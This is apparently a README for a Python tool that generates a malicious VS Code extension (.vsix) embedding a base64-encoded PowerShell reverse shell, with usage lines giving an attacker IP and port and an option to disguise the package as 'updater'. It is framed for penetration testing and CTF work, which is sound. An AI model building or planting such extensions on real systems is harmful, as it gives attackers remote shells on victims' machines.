# vsix-revshell

A simple Python utility that generates a malicious Visual Studio Code extension (`.vsix`) containing a reverse shell payload.

Useful for authorized penetration testing, red team exercises, and CTF challenges (such as HTB challenges) where an automated process installs `.vsix` packages from a writable share.

## Features
- Generates a minimal, valid `.vsix` package
- Embeds a base64-encoded PowerShell reverse shell
- Targets a configurable VS Code engine version
- One-command build

## Usage
```bash
Usage:
    python3 Vsix-RevShellGen.py                      # prompts for IP/port
    python3 Vsix-RevShellGen.py -i 10.10.14.3 -p 443  # non-interactive
    python3 Vsix-RevShellGen.py -i 10.10.14.3 -p 443 --name updater --engine 1.118.0
